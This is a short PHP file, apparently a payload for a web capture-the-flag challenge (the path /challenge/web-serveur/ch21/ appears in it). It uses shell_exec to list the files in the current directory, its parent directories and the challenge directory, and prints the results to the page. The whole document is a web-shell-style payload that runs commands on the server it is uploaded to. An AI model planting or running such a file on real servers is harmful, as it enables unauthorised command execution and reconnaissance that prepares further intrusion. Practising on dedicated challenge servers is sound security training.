<?php
$homepage = shell_exec('ls -a');
echo $homepage;
echo "<br>";
$homepage = shell_exec('ls -a ../');
echo $homepage; echo "<br>";
$homepage = shell_exec('ls -a ../../');
echo $homepage; echo "<br>";
$homepage = shell_exec('ls -a /challenge/web-serveur/ch21/');
echo $homepage;
?>
